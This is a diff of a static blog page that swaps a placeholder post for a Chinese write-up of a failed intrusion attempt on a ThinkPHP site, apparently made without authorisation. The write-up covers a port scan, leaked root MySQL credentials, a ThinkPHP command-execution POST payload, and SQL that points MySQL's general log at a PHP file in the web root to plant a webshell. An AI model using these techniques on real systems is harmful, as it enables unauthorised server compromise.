@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="demo, 网络安全">
+    <meta name="keywords" content="记一次从thinkphp命令执行到失败, 网络安全">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>demo | 日常所见</title>
+    <title>记一次从thinkphp命令执行到失败 | 日常所见</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -328,7 +328,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">demo</h1>
+                    <h1 class="description center-align post-title">记一次从thinkphp命令执行到失败</h1>
                 </div>
             </div>
         </div>
@@ -442,12 +442,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">渗透</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web%E5%89%8D%E7%AB%AF/" class="post-category">
+                                web前端
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -456,7 +469,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-09
+                    2021-09-10
                 </div>
                 
 
@@ -477,7 +490,58 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="hello-word"><a href="#hello-word" class="headerlink" title="hello word"></a>hello word</h3><h1 id="this-is-my-first-project"><a href="#this-is-my-first-project" class="headerlink" title="this is my first project"></a>this is my first project</h1>
+                <h2 id="记一次从thinkphp命令执行到失败"><a href="#记一次从thinkphp命令执行到失败" class="headerlink" title="记一次从thinkphp命令执行到失败"></a>记一次从thinkphp命令执行到失败</h2><p>某一次我在正常的上班（摸鱼）中一位同事 啪！ 的一声给我发过来一个网站，并直白的告诉我这是个tp的并直白的告诉我这是个不正经的网站，于是我悄悄地打开了，很快引入眼帘。</p>
+<p><img src="../_posts/0910/1.png"></p>
+<p>豁！！！  果然不正经，小白的我开始抡起了我的三板斧。</p>
+<ul>
+<li>先来第一步</li>
+</ul>
+<p>端口扫描</p>
+<p><img src="../_posts/0910/2.jpg"></p>
+<p>发现三个web端口，一个ssh，一个mysql</p>
+<p>没有多余端口就不浪费时间，抓紧下一步（就是这么猴急）</p>
+<ul>
+<li>第二步</li>
+</ul>
+<p>直接上工具验证（因为大老告诉我是tp）掏出我的工具直接测试</p>
+<p><img src="../_posts/0910/3.jpg"></p>
+<p>哦豁  发现了什么！！！！！！<br>数据库账号密码，还是root!!!!</p>
+<ul>
+<li>第三步</li>
+</ul>
+<p>拿出祖传大宝贝 Navicat premium 连接试试</p>
+<p><img src="../_posts/0910/4.jpg"></p>
+<p>真连上了！！！  我不断地查看数据发现一个可以的表think_admin</p>
+<p><img src="../_posts/0910/5.jpg"></p>
+<p>当时我以为我是最牛的大佬，全世界都在我脚下，任何人都要臣服于我的时候。。。</p>
+<p><img src="../_posts/0910/6.png"></p>
+<p>空气一片安静，仿佛世界都黑了，为什么。。。。 他娘的就不能设置个简单的密码吗。。。。。</p>
+<p>于是我调转思路尝试用tp的命令执行尝试一波</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://x.x.x.x/index.php?s=index</span><br><span class="line"></span><br><span class="line">Post</span><br><span class="line">_method=__construct&amp;method=GET&amp;filter[]=system&amp;get[]=whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="../_posts/0910/7.jpg"></p>
+<p>尝试写入shell</p>
+<p><img src="../_posts/0910/8.jpg"></p>
+<p>失败</p>
+<p>请查阅 <a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1648">https://forum.90sec.com/t/topic/1648</a></p>
+<p>尝试过大佬的各种骚操作，最终得出结论权限不足。。。</p>
+<p>既然web的路走不通搞数据库吧</p>
+<ul>
+<li>第四步</li>
+</ul>
+<p>看一下日志配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../_posts/0910/9.jpg"></p>
+<p>再执行日志文件位置修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set global general_log=&#x27;on&#x27;;</span><br><span class="line"></span><br><span class="line"># 修改日志文件位置</span><br><span class="line">set global general_log_file=&#x27;/var/www/html/thinkphp/public/ww.php&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../_posts/0910/10.jpg"></p>
+<p>又是权限问题。。。。。。</p>
+<h1 id="算了-终究错付了"><a href="#算了-终究错付了" class="headerlink" title="算了   终究错付了"></a>算了   终究错付了</h1><p>彩蛋</p>
+<p>在我查看前端源码的时候发现账号密码居然是前端校验的但是输入后依旧不对</p>
+<p><img src="../_posts/0910/11.jpg"></p>
+
                 
             </div>
             <hr/>
@@ -503,7 +567,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.cyb3rr1ck.xyz/2021/09/09/demo/">https://www.cyb3rr1ck.xyz/2021/09/09/demo/</a>
+                    <a href="https://www.cyb3rr1ck.xyz/2021/09/10/0910/">https://www.cyb3rr1ck.xyz/2021/09/10/0910/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -540,7 +604,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">无标签</span>
+                            
+                                <a href="/tags/%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">渗透</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -715,13 +783,13 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/2021/09/09/demo/">
+                <a href="/2021/09/10/0910/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="demo">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="记一次从thinkphp命令执行到失败">
                         
-                        <span class="card-title">demo</span>
+                        <span class="card-title">记一次从thinkphp命令执行到失败</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -732,17 +800,29 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-10
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Cyb3rr1ck
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%89%8D%E7%AB%AF/" class="post-category">
+                                    web前端
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
@@ -753,13 +833,13 @@
                 本篇&nbsp;<i class="far fa-dot-circle"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/09/demo/">
+                <a href="/2021/09/10/0910/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="demo">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="记一次从thinkphp命令执行到失败">
                         
-                        <span class="card-title">demo</span>
+                        <span class="card-title">记一次从thinkphp命令执行到失败</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -770,17 +850,29 @@
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-09
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-10
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            Cyb3rr1ck
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%89%8D%E7%AB%AF/" class="post-category">
+                                    web前端
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
 
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">渗透</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
